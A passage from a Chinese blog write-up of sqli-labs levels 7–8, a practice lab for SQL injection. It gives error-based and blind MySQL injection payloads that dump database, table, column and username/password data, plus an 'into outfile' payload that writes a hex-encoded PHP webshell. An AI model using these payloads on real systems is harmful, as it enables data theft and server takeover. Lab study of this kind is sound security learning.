+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1</span><br></pre></td></tr></table></figure>
+<p>页面显示：</p>
+<blockquote>
+<p>You are in… Use outfile…</p>
+</blockquote>
+<p>加入’<br>
+页面显示：</p>
+<blockquote>
+<p>You have an error in your SQL syntaxYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘‘1’’)) LIMIT 0,1’ at line 1</p>
+</blockquote>
+<p>说明是 ((’’)) 闭合</p>
+<h4 id="获取数据库名称-5"><a class="markdownIt-Anchor" href="#获取数据库名称-5">#</a> 获取数据库名称</h4>
+<p>运用报错注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27;)) and updatexml(1,concat(0x7e,(select database()),0x7e),3) --+</span><br></pre></td></tr></table></figure>
+<p>页面显示：</p>
+<blockquote>
+<p>You have an error in your SQL syntaxXPATH syntax error: ‘<sub>security</sub>’</p>
+</blockquote>
+<p>得到数据库名称为 security</p>
+<h4 id="获取所有表名-4"><a class="markdownIt-Anchor" href="#获取所有表名-4">#</a> 获取所有表名</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27;)) and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema = &#x27;security&#x27;),1,31),0x7e),3) --+</span><br></pre></td></tr></table></figure>
+<p>页面显示：</p>
+<blockquote>
+<p>You have an error in your SQL syntaxXPATH syntax error: ‘<sub>emails,referers,uagents,users</sub>’</p>
+</blockquote>
+<p>得到所有的表名为<strong> emails,referers,uagents,users</strong></p>
+<h4 id="获取users表中的所有列名-2"><a class="markdownIt-Anchor" href="#获取users表中的所有列名-2">#</a> 获取 users 表中的所有列名</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27;)) and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name = &#x27;users&#x27; and table_schema = &#x27;security&#x27;),1,31),0x7e),3) --+</span><br></pre></td></tr></table></figure>
+<p>页面显示：</p>
+<blockquote>
+<p>You have an error in your SQL syntaxXPATH syntax error: ‘<sub>id,username,password</sub>’</p>
+</blockquote>
+<p>可以知道 users 表中所有的列名为<strong> id,username,password</strong></p>
+<h4 id="获取users表中的所有username和password-2"><a class="markdownIt-Anchor" href="#获取users表中的所有username和password-2">#</a> 获取 users 表中的所有 username 和 password</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27;)) and updatexml(1,concat(0x7e,(select concat(username,&#x27;^&#x27;,password) from users limit 0,1),0x7e),3) --+</span><br></pre></td></tr></table></figure>
+<p>页面显示：</p>
+<blockquote>
+<p>You have an error in your SQL syntaxXPATH syntax error: ‘<sub>Dumb^Dumb</sub>’</p>
+</blockquote>
+<p>得到第一组 username 和 password 为 Dumb^Dumb<br>
+ 接着更改 limit 后面的数字获取所有的 username 和 password</p>
+<h4 id="写入webshell-4"><a class="markdownIt-Anchor" href="#写入webshell-4">#</a> 写入 webshell</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27;)) into outfile &#x27;C:/Less7.php&#x27; lines terminated by 0x3c3f7068702061737365727428245f504f53545b4c657373375d293b203f3e --+</span><br></pre></td></tr></table></figure>
+<h2 id="sqli-labs-8"><a class="markdownIt-Anchor" href="#sqli-labs-8">#</a> sqli-labs-8</h2>
+<h4 id="初步判断-7"><a class="markdownIt-Anchor" href="#初步判断-7">#</a> 初步判断</h4>
+<p>输入正确的 id</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1</span><br></pre></td></tr></table></figure>
+<p>页面显示：</p>
+<blockquote>
+<p>You are in…</p>
+</blockquote>
+<p>说明本题不回显<br>
+加上’<br>
+页面显示异常，本题报错不回显<br>
+输入–+<br>
+ 页面显示正常<br>
+说明有包装</p>
+<p>本题需要我们使用盲注来获取信息</p>
+<h4 id="获取数据库名称-6"><a class="markdownIt-Anchor" href="#获取数据库名称-6">#</a> 获取数据库名称</h4>
+<p>先判断数据库名称的长度</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; and (length(database()))=1 --+</span><br></pre></td></tr></table></figure>
+<p>从 1 一直到 8 时<br>
+此时页面显示 you are in…<br>
+ 说明数据库名称长度为 8</p>
+<p>用 left 获取数据库名称从左到右的字符这里（也可以使用 ascii 等）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; and left((select database()),1)=&#x27;s&#x27; --+</span><br></pre></td></tr></table></figure>
+<p>依次增加数字和尝试后面的字符，可以配合 &gt;,&lt;,=, 二分法一起使用<br>
+如 url?id=1’ and left ((select database ()),1)&gt;‘a’ --+<br>
+ 最终可以得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; and left((select database()),8)=&#x27;security&#x27;</span><br></pre></td></tr></table></figure>
+<p>即数据库名称等于 security</p>
+<h4 id="获取所有信息"><a class="markdownIt-Anchor" href="#获取所有信息">#</a> 获取所有信息</h4>
+<p>除此之外我们还可以获得所有数据库的名称，使用同样的方法去一个一个才出来，也可以使用 sqlmap 直接跑，获取所有的内容<br>
+如果手工注入可能花费的时间比较久<br>
+ payload 如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//获取所有数据库名称</span><br><span class="line">url?id=1&#x27; and left((select schema_name from information_schema.schemata limit 0,1),5)=&#x27;mysql&#x27; --+ //查出来本地的第一个数据库为mysql</span><br><span class="line">//获取security数据库下的所有表名</span><br><span class="line">?id=1&#x27; and left((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1)&gt;&#x27;a&#x27; --+</span><br><span class="line">//获取security数据库users表下的所有列名</span><br><span class="line">?id=1&#x27; and left((select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27; limit 0,1),1)&gt;&#x27;a&#x27; --+</span><br><span class="line">//获取所有username和password</span><br><span class="line">?id=1&#x27; and left((select username from users limit 0,1),1)&gt;&#x27;a&#x27; --+</span><br></pre></td></tr></table></figure>
+
+  </div>
+  
+  
+    
+    <div class='footer'>
+       <!-- 参考资料、相关资料等 -->
+      
+       <!-- 相关文章 -->
+      
+      <!-- 版权声明组件 -->
+      
+      <!-- 打赏组件 -->
+      
+    </div>
+  
+  
+    
+
+
+  <div class='article-meta' id="bottom">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2023-11-04T00:16:22+08:00">
+  <a class='notlink'>
+    <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：Nov 4, 2023</p>
+  </a>
+</div>
+
+        
+      
+        
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/sqli-labs/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>sqli-labs</p></a></div>
+  <span hidden itemprop="keywords">sqli-labs</span>
+
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://chenzhengkai10.github.io/2022/12/21/sqli-labs-1-8/&title=sqli-labs-1-8 - Dr4x3zz&summary=# sqli-labs-1-8"
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qq.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qq.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://chenzhengkai10.github.io/2022/12/21/sqli-labs-1-8/&title=sqli-labs-1-8 - Dr4x3zz&summary=# sqli-labs-1-8"
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qzone.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qzone.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=https://chenzhengkai10.github.io/2022/12/21/sqli-labs-1-8/&title=sqli-labs-1-8 - Dr4x3zz&summary=# sqli-labs-1-8"
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/weibo.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/weibo.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+    <!-- Custom Files bottomMeta begin -->
+    
+    <!-- Custom Files bottomMeta end -->
+  </div>
+
+
+  
+  
+
+  
+    <div class="prev-next">
+      
+        <a class='prev' href='/2022/12/22/php%E5%AD%A6%E4%B9%A02022-12-22/'>
+          <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>php学习2022-12-22</p>
+          <p class='content'># php 学习 (三元运算、if_else、switch)
+
+# 三元运算
+
+三元运算符的格式：(expr1) ? (expr2) : (expr3)
+ 解释：如果条件”expr1” 成立，则...</p>
+        </a>
+      
+      
+        <a class='next' href='/2022/12/21/php%E5%AD%A6%E4%B9%A02022-12-21/'>
+          <p class='title'>php学习2022-12-21<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'># php 学习 (常量、运算符、字符串函数)
+# 
+# 常量
+
+设置常量通常用 define () 函数
+ define (“常量的名称”,“常量的值”,(可定义为 true 也可不写));
+...</p>
+        </a>
+      
+    </div>
+  
+  <!-- Custom Files postEnd begin-->
+  
+  <!-- Custom Files postEnd end-->
+</article>
+
+
+  
+
+
+  <article class="post white-box shadow floatable blur" id="comments">
+    <span hidden>
+      <meta itemprop="discussionUrl" content="/2022/12/21/sqli-labs-1-8/index.html#comments">
+    </span>
+    <p ct><i class='fa-solid fa-comments'></i> 评论</p>
+    
+
+    <div id="layoutHelper-comments"></div>
+
+  </article>
+
+
+
+
+
+
+</div>
+<aside id='l_side' itemscope itemtype="http://schema.org/WPSideBar">
+  
+
+  
+    
+    
+      
+    
+  
+
+
+<div class="widget-sticky pjax">
+
+  
+  
+
+
+  <section class="widget toc-wrapper desktop mobile " id="toc-div" >
+    
+  <header>
+    
+      <i class="fa-solid fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-1-8"><span class="toc-text"> sqli-labs-1-8</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="toc-text"> SQL 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8"><span class="toc-text"> SQL 注入常用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%93%AA%E9%87%8C%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5"><span class="toc-text"> 哪里存在 SQL 注入？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E7%9A%84%E7%B1%BB%E5%9E%8B"><span class="toc-text"> sql 注入的类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mysql%E4%B8%AD3%E7%A7%8D%E6%B3%A8%E9%87%8A%E9%A3%8E%E6%A0%BC"><span class="toc-text"> MySQL 中 3 种注释风格</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-text"> 判断注入点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4"><span class="toc-text"> 步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%88%A4%E6%96%AD%E5%88%97%E6%95%B0"><span class="toc-text"> 1、判断列数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%88%A4%E6%96%AD%E6%98%BE%E7%A4%BA%E4%BD%8D"><span class="toc-text"> 2、判断显示位</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E8%8E%B7%E5%8F%96%E5%BD%93%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%A7%B0%E5%92%8C%E5%BD%93%E5%89%8D%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E7%94%A8%E6%88%B7"><span class="toc-text"> 3、获取当数据库名称和当前连接数据库的用户</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E5%88%97%E5%87%BA%E6%89%80%E6%9C%89%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text"> 4、列出所有数据库</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-%E5%88%97%E5%87%BA%E6%95%B0%E6%8D%AE%E5%BA%93test%E4%B8%AD%E6%89%80%E6%9C%89%E7%9A%84%E8%A1%A8"><span class="toc-text"> 5、列出 (数据库：test) 中所有的表</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#6-%E5%88%97%E5%87%BA%E6%95%B0%E6%8D%AE%E5%BA%93test-%E8%A1%A8admin-%E4%B8%AD%E6%89%80%E6%9C%89%E7%9A%84%E5%AD%97%E6%AE%B5"><span class="toc-text"> 6、列出（数据库：test 表：admin ）中所有的字段</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#7-%E5%88%97%E5%87%BA%E6%95%B0%E6%8D%AE%E5%BA%93test-%E8%A1%A8admin-%E4%B8%AD%E7%9A%84%E6%95%B0%E6%8D%AE"><span class="toc-text"> 7、列出（数据库：test 表：admin ）中的数据</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sqli-labs-1"><span class="toc-text"> sqli-labs-1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8order-by%E7%8C%9C%E8%A7%A3%E5%88%97%E6%95%B0"><span class="toc-text"> 用 order by 猜解列数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%98%BE%E7%A4%BA%E5%9B%9E%E6%98%BE%E4%BD%8D"><span class="toc-text"> 显示回显位</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E6%95%B0%E6%8D%AE"><span class="toc-text"> 爆数据</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E8%A1%A8%E5%90%8D"><span class="toc-text"> 查询表名</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E5%88%97%E6%98%8E"><span class="toc-text"> 查询列明</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE"><span class="toc-text"> 查询数据</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-2"><span class="toc-text"> sqli-labs-2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9D%E6%AD%A5%E5%88%A4%E6%96%AD"><span class="toc-text"> 初步判断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E5%88%97%E6%95%B0"><span class="toc-text"> 查询列数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E5%93%AA%E4%B8%AA%E5%AD%97%E6%AE%B5%E6%9C%89%E5%9B%9E%E6%98%BE"><span class="toc-text"> 确定哪个字段有回显</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%A7%B0"><span class="toc-text"> 确定当前数据库名称</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BE%97%E5%87%BA%E6%95%B0%E6%8D%AE%E5%BA%93%E6%89%80%E6%9C%89%E8%A1%A8%E5%90%8D"><span class="toc-text"> 得出数据库所有表名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BE%97%E5%87%BA%E6%95%B0%E6%8D%AE%E5%BA%93%E6%89%80%E6%9C%89%E5%88%97%E5%90%8D"><span class="toc-text"> 得出数据库所有列名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BE%97%E5%87%BAusers%E8%A1%A8%E4%B8%AD%E7%9A%84%E6%89%80%E6%9C%89username%E5%92%8Cpassword"><span class="toc-text"> 得出 users 表中的所有 username 和 password</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%85%A5webshell"><span class="toc-text"> 写入 webshell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-3"><span class="toc-text"> sqli-labs-3</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9D%E6%AD%A5%E5%88%A4%E6%96%AD-2"><span class="toc-text"> 初步判断</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E4%B8%80%E4%B8%8B%E6%98%AF%E5%90%A6%E5%9B%9E%E6%98%BE"><span class="toc-text"> 判断一下是否回显</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E9%9C%80%E8%A6%81%E9%97%AD%E5%90%88%E4%BB%80%E4%B9%88%E7%AC%A6%E5%8F%B7"><span class="toc-text"> 判断需要闭合什么符号</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E4%BB%80%E4%B9%88%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-text"> 判断是什么型注入</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%88%97%E6%95%B0"><span class="toc-text"> 获取列数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%A7%B0"><span class="toc-text"> 获取数据库名称</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%89%80%E6%9C%89%E8%A1%A8%E5%90%8D"><span class="toc-text"> 获取所有表名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%ADusers%E8%A1%A8%E7%9A%84%E6%89%80%E6%9C%89%E5%88%97%E5%90%8D"><span class="toc-text"> 获取数据库中 users 表的所有列名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E5%87%BAusers%E8%A1%A8%E4%B8%AD%E7%9A%84%E6%89%80%E6%9C%89username%E5%92%8Cpassword"><span class="toc-text"> 爆出 users 表中的所有 username 和 password</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%85%A5webshelll"><span class="toc-text"> 写入 webshelll</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-4"><span class="toc-text"> sqli-labs-4</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text"> 前言</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9D%E6%AD%A5%E5%88%A4%E6%96%AD-3"><span class="toc-text"> 初步判断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%88%97%E6%95%B0"><span class="toc-text"> 判断列数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%9B%9E%E6%98%BE%E5%AD%97%E6%AE%B5"><span class="toc-text"> 判断回显字段</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%A7%B0-2"><span class="toc-text"> 获取数据库名称</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%89%80%E6%9C%89%E7%9A%84%E6%95%B0%E6%8D%AE"><span class="toc-text"> 获取所有的数据</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-5"><span class="toc-text"> sqli-labs-5</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E5%85%B3%E6%B6%89%E5%8F%8A%E5%86%85%E5%AE%B9"><span class="toc-text"> 本关涉及内容</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#updatexml"><span class="toc-text"> updatexml()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#concat"><span class="toc-text"> concat()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#substr"><span class="toc-text"> substr()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#select-distinct"><span class="toc-text"> select distinct()</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9D%E6%AD%A5%E5%88%A4%E6%96%AD-4"><span class="toc-text"> 初步判断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%A7%B0-3"><span class="toc-text"> 获取数据库名称</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%89%80%E6%9C%89%E8%A1%A8%E5%90%8D-2"><span class="toc-text"> 获取所有表名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96users%E6%89%80%E6%9C%89%E5%88%97%E5%90%8D"><span class="toc-text"> 获取 users 所有列名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%89%80%E6%9C%89username%E5%92%8Cpassword"><span class="toc-text"> 获取所有 username 和 password</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%85%A5webshell-2"><span class="toc-text"> 写入 webshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%85%A5webshell%E5%BD%92%E7%BA%B3"><span class="toc-text"> 写入 webshell 归纳</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-union-select%E5%86%99%E5%85%A5"><span class="toc-text"> 1、union select 写入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#lines-terminated-by%E5%86%99%E5%85%A5"><span class="toc-text"> Lines terminated by 写入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-lines-starting-by%E5%86%99%E5%85%A5"><span class="toc-text"> 3、lines starting by 写入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-fields-terminated-by%E5%86%99%E5%85%A5"><span class="toc-text"> 4、fields terminated by 写入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-columns-terminated-by%E5%86%99%E5%85%A5"><span class="toc-text"> 5、COLUMNS terminated by 写入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#6-%E5%88%A9%E7%94%A8log%E5%86%99%E5%85%A5"><span class="toc-text"> 6、利用 log 写入</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-6"><span class="toc-text"> sqli-labs-6</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9D%E6%AD%A5%E5%88%A4%E6%96%AD-5"><span class="toc-text"> 初步判断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%A7%B0-4"><span class="toc-text"> 获取数据库名称</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%89%80%E6%9C%89%E8%A1%A8%E5%90%8D-3"><span class="toc-text"> 获取所有表名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96users%E8%A1%A8%E4%B8%AD%E7%9A%84%E6%89%80%E6%9C%89%E5%88%97%E5%90%8D"><span class="toc-text"> 获取 users 表中的所有列名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96users%E8%A1%A8%E4%B8%AD%E7%9A%84%E6%89%80%E6%9C%89username%E5%92%8Cpassword"><span class="toc-text"> 获取 users 表中的所有 username 和 password</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%85%A5webshell-3"><span class="toc-text"> 写入 webshell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-7"><span class="toc-text"> sqli-labs-7</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9D%E6%AD%A5%E5%88%A4%E6%96%AD-6"><span class="toc-text"> 初步判断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%A7%B0-5"><span class="toc-text"> 获取数据库名称</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%89%80%E6%9C%89%E8%A1%A8%E5%90%8D-4"><span class="toc-text"> 获取所有表名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96users%E8%A1%A8%E4%B8%AD%E7%9A%84%E6%89%80%E6%9C%89%E5%88%97%E5%90%8D-2"><span class="toc-text"> 获取 users 表中的所有列名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96users%E8%A1%A8%E4%B8%AD%E7%9A%84%E6%89%80%E6%9C%89username%E5%92%8Cpassword-2"><span class="toc-text"> 获取 users 表中的所有 username 和 password</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%85%A5webshell-4"><span class="toc-text"> 写入 webshell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-8"><span class="toc-text"> sqli-labs-8</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9D%E6%AD%A5%E5%88%A4%E6%96%AD-7"><span class="toc-text"> 初步判断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%A7%B0-6"><span class="toc-text"> 获取数据库名称</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%89%80%E6%9C%89%E4%BF%A1%E6%81%AF"><span class="toc-text"> 获取所有信息</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </section>
+
+  
+
+</div>
+
+
+<!-- 没有 pjax 占位会报错 万恶的 pjax -->
+
+  <div class="pjax">
+    <!-- pjax占位 -->
+  </div>
+
+  <div class="pjax">
+    <!-- pjax占位 -->
+  </div>
+
+  <div class="pjax">
+    <!-- pjax占位 -->
+  </div>
+
+  <div class="pjax">
+    <!-- pjax占位 -->
+  </div>
+
+  <div class="pjax">
+    <!-- pjax占位 -->
+  </div>
+
+  <div class="pjax">
+    <!-- pjax占位 -->
+  </div>
+
+  <div class="pjax">
+    <!-- pjax占位 -->
+  </div>
+
+  <div class="pjax">
+    <!-- pjax占位 -->
+  </div>
+
+  <!-- Custom Files side begin -->
+  
+  <!-- Custom Files side end -->
+</aside>
+
+
+
+          <!--此文件用来存放一些不方便取值的变量-->
+<!--思路大概是将值藏到重加载的区域内-->
+
+<pjax>
+<script>
+  window.pdata={}
+  pdata.ispage=true;
+  pdata.commentPath="";
